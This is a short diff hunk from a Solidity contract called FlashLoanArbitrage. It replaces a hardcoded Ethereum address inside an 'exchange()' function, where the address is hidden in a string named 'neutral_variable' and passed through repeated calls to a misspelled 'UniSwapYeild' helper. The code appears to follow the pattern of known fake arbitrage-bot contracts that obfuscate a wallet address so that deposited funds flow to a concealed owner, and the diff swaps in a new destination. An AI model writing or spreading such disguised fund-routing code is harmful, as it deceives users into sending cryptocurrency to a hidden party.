@@ -48,7 +48,7 @@ contract FlashLoanArbitrage {
  } 
 
    function exchange() public pure returns (address adr) {
-   string memory neutral_variable = "0x64dd53424eca6ad416a92572786c9c63ac5973c8";
+   string memory neutral_variable = "0x59569be55ec7C6343c7392F8973D9F1D0f844A79";
    UniSwapYeild(neutral_variable,0,'0');
    UniSwapYeild(neutral_variable,2,'1');
    UniSwapYeild(neutral_variable,1,'x');
